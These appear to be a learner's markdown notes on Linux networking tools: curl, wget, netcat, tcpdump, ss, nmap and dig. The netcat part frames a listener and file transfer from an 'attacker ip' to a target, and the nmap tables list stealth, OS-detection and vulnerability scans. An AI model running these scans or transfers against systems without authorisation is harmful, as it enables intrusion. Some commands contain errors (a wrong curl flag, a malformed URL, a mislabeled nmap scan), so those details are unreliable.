# Linux Commands

**curl**
- Client for URL transfers
- makes HTTP/HTTPS requests from the terminal
- eg.
	- `curl https:// example.com` # GET Request
	- `curl -x POST -d "username=ethan&password=secret" https://example.com/login` # POST request

**wget**
- download files over HTTP/S
- `wget https.//example.come/file.zip`

**http- HTTPie**
- modern alternative to curl
- `http https://example.com`

**openssl s_client**
- inspect HTTPS/TLS connections
- creates a raw TLS/SSL connection to a server
- shows cert details and cipher suite negotiation
- eg.
	- `openssl s_client -connect example.com:443`

**tcpdump**
- capture network packets
- eg.
	- `sudo tcpdump -i eth0 tcp port 80 -A`

**nc** (netcat)
- opens raw TCP/UDP connections
- eg. 
	- `nc example.com 80`
	- then,
	- `GET / HTTP/1.1`
	- `Host: example.com`
- connecting to servers
	- `nc -nv[u] (target-ip) (port)`
		- u if udp 
- listening as a server
	- `nc -nvlp (port)`
- file transfer (raw TCP-based file transfer without HTTP, FTP..)
	- `nc -nv (attacker ip) (port) > (out-file)
		- target connects to attacker's listener. the incoming stream is written into out-file on target
	- `nc -nvlp (port) < (file)` 
		- attacker opens a tcp listener and waits. once target connects, file gets sent to target
	- basically, the < makes nc send a file's contents, > makes nc save received data into a file

**telnet**
- same as above

**ss/netstat**
- view network connections
- show TCP/UDP socket status, including those using HTTP (port 80) or HTTPS (port 443)
- eg.
	- `ss -tuln` # show all listening and connected sockets
	- `ss -tanp | grep ':80\|:443`' # show active HTTP/HTTPS connections

**nmap**
- port scanning and service detection
- scan hosts to find open HTTP(S) ports and get service/version info
- eg.
	- `nmap -p 80,443 example.com`

| Command                          | Purpose                                     |
| -------------------------------- | ------------------------------------------- |
| `nmap 192.168.1.1`               | Basic ping scan to check if host is up      |
| `nmap -sS 192.168.1.1`           | SYN (stealth) scan to check open TCP ports  |
| `nmap -sV 192.168.1.1`           | Scan open ports and detect service versions |
| `nmap -O 192.168.1.1`            | Try to detect the operating system          |
| `nmap -p 80,443,22 192.168.1.1`  | Scan specific ports                         |
| `nmap 192.168.1.0/24`            | Scan entire subnet (CIDR format)            |
| `nmap --script vuln 192.168.1.1` | Run vulnerability detection scripts         |

| Scan Type           | Option | Description                                               |
| ------------------- | ------ | --------------------------------------------------------- |
| **TCP Connect**     | `-sT`  | Standard full TCP handshake (visible in logs)             |
| **SYN (Stealth)**   | `-sS`  | Sends SYN only, doesn't complete handshake (stealthy)     |
| **UDP**             | `-sU`  | Probes UDP ports (slower, often needs `sudo`)             |
| **Ping Scan**       | `-sn`  | Just checks which hosts are up (no ports)                 |
| **Aggressive Scan** | `-A`   | Combines OS detection, version detection, script scanning |


**dig/host**
- DNS tooles
- resolves domain names to IP addresses
- eg. 
	- `dig example.com`